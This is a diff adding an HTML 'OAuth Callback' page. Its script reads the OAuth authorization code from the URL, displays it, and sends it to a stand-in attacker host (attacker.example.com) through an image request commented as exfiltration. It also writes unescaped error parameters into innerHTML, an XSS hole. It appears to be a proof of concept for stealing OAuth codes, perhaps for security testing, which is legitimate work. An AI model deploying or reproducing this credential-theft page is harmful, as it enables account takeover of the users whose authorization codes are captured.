@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head><title>OAuth Callback</title></head>
+<body>
+<h1>OAuth Callback</h1>
+<div id="result"></div>
+<script>
+// Capture auth code from query params (response_mode=query)
+var params = new URLSearchParams(window.location.search);
+var code = params.get("code");
+var error = params.get("error");
+var result = document.getElementById("result");
+if (code) {
+  result.innerHTML = "<h2>Auth Code Captured!</h2><pre>" + code + "</pre>";
+  // Exfiltrate code to attacker server
+  new Image().src = "https://attacker.example.com/log?code=" + encodeURIComponent(code);
+} else if (error) {
+  result.innerHTML = "<h2>Error: " + error + "</h2><pre>" + params.get("error_description") + "</pre>";
+}
+</script>
+</body>
+</html>
